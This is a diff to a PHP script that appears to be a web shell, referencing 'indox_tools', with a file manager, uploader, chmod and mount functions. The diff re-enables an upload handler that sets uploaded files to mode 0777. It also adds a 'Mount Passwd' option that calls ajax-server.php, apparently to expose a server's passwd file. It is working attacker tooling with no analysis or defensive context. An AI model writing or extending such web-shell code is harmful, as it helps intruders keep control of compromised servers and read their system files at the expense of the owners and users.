@@ -377,7 +377,7 @@ if(isset($_GET['indox_tools'])) {
         idx_tools("krdp");
     }
 }
-/*
+
 //move file upload
 while(list($key,$value) = each($_FILES['file']['name']))
 {
@@ -401,7 +401,7 @@ while(list($key,$value) = each($_FILES['file']['name']))
         chmod("$add",0777);
     }
 }
-*/
+
 // input upload handle
 if (isset($_GET['uploader'])) 
 {
@@ -1591,7 +1591,65 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
             </script>
             ';
         
-        }elseif($_POST['opt'] == 'mount') {
+        }
+        elseif($_POST['opt'] == 'mount_passwd') {
+            $arsource = $path."/".$_POST['name'];
+
+            echo '
+            <html>
+            <div id="spinner" class="loading"></div>
+            </html>
+            <style type="text/css">
+                #spinner {
+                    display: none;
+                }
+                .loading {
+                    border: 20px solid #ccc;
+                    width: 60px;
+                    height: 60px;
+                    border-radius: 50%;
+                    border-top-color: #1ecd97;
+                    border-left-color: #1ecd97;
+                    animation: spin 1s infinite ease-in;
+                }
+                @keyframes spin {
+                    0% {
+                        transform: rotate(0deg);
+                    }
+                    100% {
+                        transform: rotate(360deg);
+                    }
+                }
+            </style>';
+
+            echo '
+            <script>
+            var name = "'.$arsource.'";
+            var xhr = new XMLHttpRequest();
+            var encname = encodeURIComponent(name).replace("%20","+");
+            var url = "ajax-server.php?idexl=mount_passwd:"+encname;
+            
+            xhr.onloadstart = function () {
+                document.title = "Mounting...";
+                document.getElementById("spinner").style.display = "block";
+            }
+
+            xhr.onreadystatechange = function() {
+                if (this.responseText !== "" && this.readyState == 4) 
+                {
+                    document.title = "Mounting success";
+                    var data = JSON.parse(this.responseText);
+                    alert(data.status);
+
+                    location.href = "/ai-web/ai.php?path=/var/www/html/ai-web/mount";
+                }
+            };
+            xhr.open("GET", url, true);
+            xhr.send();
+            </script>
+            ';
+        }
+        elseif($_POST['opt'] == 'mount') {
             $arsource = $path."/".$_POST['name'];
 
             echo '
@@ -1823,6 +1881,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                 <select name="opt">
                 <option value="">Select</option>
                 <option value="mount">Mount</option>
+                <option value="mount_passwd">Mount Passwd</option>
                 <option value="delete">Delete</option>
                 <option value="chmod">Chmod</option>
                 <option value="rename">Rename</option>
